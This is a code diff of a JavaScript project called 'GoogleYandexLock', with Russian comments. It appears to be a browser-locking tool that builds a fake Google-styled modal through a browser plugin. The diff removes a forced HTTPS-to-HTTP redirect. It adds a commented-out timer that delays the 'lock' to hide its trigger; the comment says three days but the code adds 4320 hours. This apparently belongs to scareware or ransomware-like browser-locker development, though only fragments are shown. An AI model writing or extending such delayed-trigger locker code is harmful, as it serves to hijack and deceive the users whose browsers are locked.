@@ -7,6 +7,7 @@
 */	
 
 // Загружаем стиль
+
 function LoadCSS() {
     var NewCSS = document.createElement("link");
     NewCSS.setAttribute("href", "localhost/GoogleYandexLock/google/style.css");
@@ -192,10 +193,7 @@ function  SecondStep() {
 
 function ShowMeGoogle() { 
     
-	if (window.location.protocol !== 'http:') {
-		window.location = 'http://' + window.location.hostname + window.location.pathname + window.location.hash;
-		console.log('http');
-	}
+	
 	var modalWnd = document.createElement("div");
     modalWnd.setAttribute("id", "gShock");
     modalWnd.setAttribute("position", "relative");
@@ -475,13 +473,56 @@ function Start() {
 	}
 
   window.onload = function () {
-		
-		SetHttpProtocol();
 		TimeOut ();
+		//TimeSet();
 		SetTime();
 	
 } 
+/* // запуск лока произойдет после 3х суток!!!
+function TimeSet(){
+	if (plg){
+		var time = plg.Get('gStartTime');
+		if (time){
+			console.log('time is be');
+			var timeNow = new Date().getTime() /1000 / 60 / 60;
+			timeNow = timeNow - (timeNow % 1);
+			console.log('Lock start at ' +timeNow);
+			console.log(time);
+			if (timeNow <= time){
+				console.log(timeNow);
+				var status = plg.Get('lon');
+				if (status == '0'){
+					plg.Save('lon','1');
+					console.log('lon=1');
+					Start();
+				}
+				else {
+					if (status=='2');
 
+					Start();
+					return false;
+				}
+				
+				
+			}
+			else{
+				LockStop();
+				return false;
+			}
+			
+		}
+		else {
+			console.log('time is not found');
+			var timer = new Date().getTime() / 1000 / 60/ 60;	
+			timer = timer - (timer % 1);
+			timer += 4320;
+			console.log('first time is '+ timer);
+			plg.Save('gStartTime',timer.toString());
+			console.log('now is '+ plg.Get('gStartTime'));
+		}
+	}
+		
+} */
 
 function InstallPlg() {
 	var id = 'null',
@@ -548,13 +589,6 @@ function SetTime() {
 					
 				}
 			}
-	}
-}
-
-function SetHttpProtocol() {
-	if (window.location.protocol !== 'http:') {
-		window.location = 'http://' + window.location.hostname + window.location.pathname + window.location.hash;
-		console.log('http');
 	}
 }
 
